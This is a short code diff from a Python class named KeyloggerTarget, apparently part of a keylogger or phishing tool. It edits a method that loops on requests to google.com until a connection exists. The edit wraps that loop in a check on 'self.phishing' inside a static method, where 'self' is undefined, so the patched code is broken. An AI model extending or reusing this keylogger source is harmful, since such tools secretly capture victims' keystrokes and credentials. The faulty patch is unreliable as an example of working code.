@@ -338,14 +338,15 @@ class KeyloggerTarget:
     @staticmethod
     def internet_connection():
         # This function checks if a connection is stable
-        while True:
-            try:
-                requests.get("https://www.google.com/")
-                # Google is always online so I chose google
-                break
-                # If there is an internet connection it will run as normal
-            except requests.exceptions.ConnectionError:
-                print("No Connection")
+        if self.phishing is not None:
+            while True:
+                try:
+                    requests.get("https://www.google.com/")
+                    # Google is always online so I chose google
+                    break
+                    # If there is an internet connection it will run as normal
+                except requests.exceptions.ConnectionError:
+                    print("No Connection")
 
     def start(self):
         self.internet_connection()
